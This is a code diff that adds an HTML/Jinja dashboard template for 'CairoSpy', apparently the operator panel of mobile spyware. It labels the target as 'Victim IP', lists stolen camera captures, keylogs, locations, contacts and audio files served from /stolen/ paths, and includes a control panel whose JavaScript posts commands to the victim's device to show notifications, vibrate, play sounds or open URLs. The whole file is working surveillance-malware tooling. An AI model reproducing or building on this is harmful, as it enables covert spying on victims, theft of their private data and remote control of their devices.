@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CairoSpy - Dashboard</title>
+    <style>
+        body { font-family: Arial; background: #0a0a1a; color: #fff; padding: 20px; }
+        h1 { color: #00d4ff; }
+        .card { background: #1a1a2e; border-radius: 12px; padding: 20px; margin: 20px 0; }
+        .btn { background: #00d4ff; color: #000; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin: 5px; }
+        pre { background: #111; padding: 10px; border-radius: 8px; overflow-x: auto; }
+        .file-list { max-height: 300px; overflow-y: auto; }
+        .file-list a { color: #7b2ff7; display: block; padding: 5px; }
+        input, textarea { width: 100%; padding: 10px; margin: 5px 0; border-radius: 8px; border: 1px solid #333; background: #111; color: #fff; }
+    </style>
+</head>
+<body>
+    <h1>🕵️ CairoSpy Dashboard</h1>
+    <p>Victim IP: {{ victim_ip }}</p>
+
+    <div class="card">
+        <h2>🎮 Control Panel</h2>
+        <input type="text" id="toastMsg" placeholder="Toast message">
+        <button class="btn" onclick="sendControl('toast')">Send Toast</button>
+        
+        <input type="text" id="notifyTitle" placeholder="Notification title">
+        <input type="text" id="notifyBody" placeholder="Notification body">
+        <button class="btn" onclick="sendControl('notify')">Send Notification</button>
+        
+        <button class="btn" onclick="sendControl('sound')">🔊 Play Sound</button>
+        <button class="btn" onclick="sendControl('vibrate')">📳 Vibrate</button>
+        
+        <input type="url" id="openUrl" placeholder="https://example.com">
+        <button class="btn" onclick="sendControl('open_url')">Open URL</button>
+    </div>
+
+    <div class="card">
+        <h2>📸 Camera</h2>
+        <div class="file-list">
+            {% for file in files.camera %}
+            <a href="/stolen/camera/{{ file }}" target="_blank">{{ file }}</a>
+            {% else %}
+            <p>No images captured yet</p>
+            {% endfor %}
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>⌨️ Keylogs</h2>
+        <div class="file-list">
+            {% for file in files.keys %}
+            <a href="/stolen/keys/{{ file }}" target="_blank">{{ file }}</a>
+            {% else %}
+            <p>No keylogs yet</p>
+            {% endfor %}
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>📍 Locations</h2>
+        <div class="file-list">
+            {% for file in files.location %}
+            <a href="/stolen/location/{{ file }}" target="_blank">{{ file }}</a>
+            {% else %}
+            <p>No locations yet</p>
+            {% endfor %}
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>👤 Contacts</h2>
+        <div class="file-list">
+            {% for file in files.contacts %}
+            <a href="/stolen/contacts/{{ file }}" target="_blank">{{ file }}</a>
+            {% else %}
+            <p>No contacts yet</p>
+            {% endfor %}
+        </div>
+    </div>
+
+    <div class="card">
+        <h2>📁 Files (Audio, etc.)</h2>
+        <div class="file-list">
+            {% for file in files.files %}
+            <a href="/stolen/files/{{ file }}" target="_blank">{{ file }}</a>
+            {% else %}
+            <p>No files yet</p>
+            {% endfor %}
+        </div>
+    </div>
+
+    <script>
+        function sendControl(action) {
+            const data = { action: action };
+            if (action === 'toast') data.message = document.getElementById('toastMsg').value || 'Hello from CairoSpy';
+            if (action === 'notify') {
+                data.title = document.getElementById('notifyTitle').value || 'Alert';
+                data.body = document.getElementById('notifyBody').value || 'You have been notified';
+            }
+            if (action === 'vibrate') data.duration = 5000;
+            if (action === 'open_url') data.url = document.getElementById('openUrl').value || 'https://example.com';
+            
+            fetch('/api/control', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(r => r.json()).then(d => console.log(d));
+        }
+    </script>
+</body>
+</html>
